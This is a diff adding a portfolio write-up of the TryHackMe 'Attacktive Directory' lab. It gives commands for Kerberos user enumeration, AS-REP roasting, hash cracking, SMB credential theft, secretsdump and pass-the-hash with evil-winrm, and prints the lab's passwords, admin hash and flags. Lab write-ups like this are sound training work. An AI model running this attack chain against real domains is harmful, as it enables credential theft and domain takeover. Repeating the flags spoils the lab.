@@ -2,6 +2,7 @@
 <html>
     <head>
         <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>THM Attacktive Directory</title>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
         <link rel="stylesheet" href="/css/styles.css">
@@ -10,12 +11,234 @@
     <body>
         <header>
             <h1>TryHackMe | Attacktive Directory Walkthrough</h1>
+             <p>TryHackMe Active Directory Lab Write-Up</p>
+                <p>By George Gitura </p>
         </header>
-        <section id="intro">
-            <h2>Introduction</h2>
+        <section>
             <div class="card">
-                <p></p>
+                <h2>1. Introduction</h2>
+                <p>
+                    This lab focused on exploiting vulnerabilities in a Windows Active Directory environment.
+                    The objective was to perform enumeration, credential harvesting, and privilege escalation
+                    in a controlled environment.
+                </p>
+            </div>
+
+            <div class="card">
+                <h2>2. Enumeration</h2>
+
+                <p>
+                    Running a service version detection scan with nmap, ports 139 and 445 were among those identified as open, indicating SMB services.
+                    Enum4linux was used for further enumeration.
+                </p>
+                <pre>
+                    nmap -sV -sC &lt;target-ip&gt;
+                </pre>
+
+                <pre>
+                    enum4linux -a &lt;target-ip&gt;
+                </pre>
+
+                <!-- SCREENSHOT PLACEHOLDER -->
+                 <img src="images/attacktive/" alt="Enum4linux results">
+
+                 <p>
+                    Domain Name discovered: <strong>THM-AD</strong><br>
+                    Domain: <strong>spookysec.local</strong>
+                </p>
+                <p>
+                    The invalid TLD people commonly use for their Active Directory Domain is <strong>.local</strong>
+                    rom the hint where the full AD domain is listed as <strong>spookysec.local</strong> 
+                </p>
+
+            </div>
+
+            <div class="card">
+                <h2>3. Kerberos User Enumeration</h2>
+
+                <p>
+                   Kerbrute was used to enumerate valid users using the userenum option and the userlist file provided. 
+                </p>
+
+                <pre>
+                    kerbrute userenum --dc &lt;ip&gt; -d THM-AD userlist.txt
+                </pre>
+
+                <!-- SCREENSHOT PLACEHOLDER -->
+                <img src="images/attacktive/kerbrute.png" alt="Kerberos enumeration">
+
+                <p>
+                Notable accounts discovered:
+                <ul>
+                    <li>svc-admin</li>
+                    <li>backup</li>
+                </ul>
+                </p>
+            </div>
+
+            <div class="card">
+                <h2>4. Exploitation: Abusing Kerberos</h2>
+                
+                <h3>ASREPRoasting</h3>
+                <p>          
+
+                    This is a method used when user has “does not require Pre-Authentication” set i.e. the account does not need to provide valid identification before granting a Kerberos ticket on the specified user account.
+                </p>
+                    <h3>Retrieving Kerberos tickets with impacket</h3>
+                <p>
+                    <strong>Impacket</strong> has a tool called <em>GetNPUsers.py</em> located in /opt/impacket/examples/GetNPUsers.py
+
+                    It allows us to query ASReproastable accounts from the Key Distribution Center.
+                </p>
+
+                <pre>
+                    python3 /opt/impacket/examples/GetNPUsers.py -dc-ip &lt;target-ip&gt; THM-AD/backup
+                </pre>
+                <p>
+                    I was able to query <strong>svc-admin's</strong> account without a password.
+                </p>
+
+                <!-- SCREENSHOT PLACEHOLDER -->
+                <img src="images/attacktive/impacket_asreproasting.png" alt="Kerberos enumeration">
+
+                <p>
+                    Checking out the hashcat examples page and looking for the beginning of the hash, <em>‘$krb5asrep$23’,</em>  the type of hash is Kerberos 5, etype 23, AS-REP. 
+                </p>
+                <!-- SCREENSHOT PLACEHOLDER -->
+                <img src="images/attacktive/kerberos_hash.png" alt="Kerberos enumeration">
+
+                <p>
+                    The mode of the hash is <strong>18200</strong>.
+                </p>
+
+                <p>
+                    Saving the hash into a file and cracking it with johntheripper
+                </p>
+                <pre>
+                   john --wordlist=/usr/share/wordlists/rockyou.txt svc_hash.txt  
+                </pre>
+
+                <!-- SCREENSHOT PLACEHOLDER -->
+                <img src="images/attacktive/cracking_the_hash.png" alt="Kerberos enumeration">
+
+                <p>
+                    svc-admin’s password is <strong>management2005.</strong>
+                </p>
+            </div>
+            <div class="card">
+                <h2>5. SMB Enumeration</h2>
+
+                <p>
+                    The tool that can be used to map remote SMB shares is <strong>smbclient</strong>
+                    The option to list shares is <strong>-L</strong>.
+                </p>
+
+                <p>
+                    Listing the SMB shares with smbclient:
+                </p>
+                <pre>
+                    smbclient -L &lt;target-ip&gt; -U THM-AD/svc-admin
+                </pre>
+                <!-- SCREENSHOT -->
+                <img src="/images/attacktive/smb_shares.png" alt="SMB shares">
+                <p>There are <strong>6</strong> shares.</p>
+                <p>
+                    I found encoded backup credentials in the <strong>backup</strong> share and decoded from base64. 
+                </p>
+                <pre>
+                    smbclient \\\\&lt;target-ip&gt;\\backup -U svc-admin
+                </pre>
+                <p>
+                    Downloading the backup_credentials.txt file and reading it.
+                </p>
+                <pre>
+                    get backup_credentials.txt
+                </pre>
+                <p>
+                    The encoded content is <strong>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</strong>.
+                    Decoding the file.
+                </p>
+                <pre>
+                    base64 -d backup_credentials.txt
+                </pre>
+                <p>
+                    The decoded text is <strong>backup@spookysec.local:backup2517860</strong>.
+                </p>
+            </div>
+
+            <div class="card">
+                <h2>6. Domain Privilege Escalation</h2>
+
+                <p>
+                    Impacket tool called <strong>secretsdump.py</strong> which can help retrieve all password hashes that an account has to offer.
+                    
+                    The dumped creds are in the following format (domain\uid:rid:lmhash:nthash)
+                </p>
+                <pre>
+                    python3 /opt/impacket/examples/secretsdump.py THM-AD/backup:backup2517860@10.81.151.28 -dc
+ip &lt;target-ip&gt;
+                </pre>
+
+                <!-- SCREENSHOT -->
+                <img src="/images/attacktive/hashdump.png" alt="Dumping the NTLM hashes">
+
+                <p>
+                    The method allowing us to dump the DIT or NTDS.DIT is <strong>DRUSAPI</strong>.
+                </p>
+                <p>
+                    The administrator's NTLM hash is <strong>0e0363213e37b94221497260b0bcb4fc</strong>.
+                </p>
+                <p>
+                    To authenticate as the user without a password, we can use an attack method called <strong>Pass the Hash</strong>;
+                </p>
+                <p>
+                    We can use a tool called <em>Evil-WinRM</em> with option <strong>-H</strong> to pass the hash.
+                </p>
+
+                
+            </div>
+
+            <div class="card">
+                <h2>6. Flag Submission</h2>
+                <h3>Passing the hash with Evil-WinRM</h3>
+
+                <p>
+                    We can pass the admin's hash and gain access, then checkout each user's flag on their Desktop.
+                </p>
+
+                <pre>
+                    evil-winrm -i &lt;ip&gt; -u Administrator -H &lt;hash&gt;
+                </pre>
+
+                <!--- SCREENSHOT -->
+                <img src="/images/attacktive/evilwinrm.png" alt="Passing the hash with Evil-WinRM">
+
+                <h3>Flags</h3>
+                <ul>
+                    <li>svc-admin: TryHackMe{K3rb3r0s_Pr3_4uth}</li>
+                    <li>backup: TryHackMe{B4ckM3UpSc0tty!}</li>
+                    <li>Administrator: TryHackMe{4ctiveD1rectoryM4st3r}</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h2>7. Lessons Learned</h2>
+
+                <ul>
+                    <li>Importance of Kerberos pre-authentication</li>
+                    <li>Risks of weak service accounts</li>
+                    <li>Dangers of credential reuse</li>
+                    <li>Need for monitoring domain activity</li>
+                </ul>
+
+                <p>
+                    This lab provided practical experience in attacking and understanding Active Directory environments.
+                </p>
             </div>
         </section>
+
+        <footer>
+<p>© 2026 George Gitura | Portfolio</p>
+</footer>
     </body>
 </html>
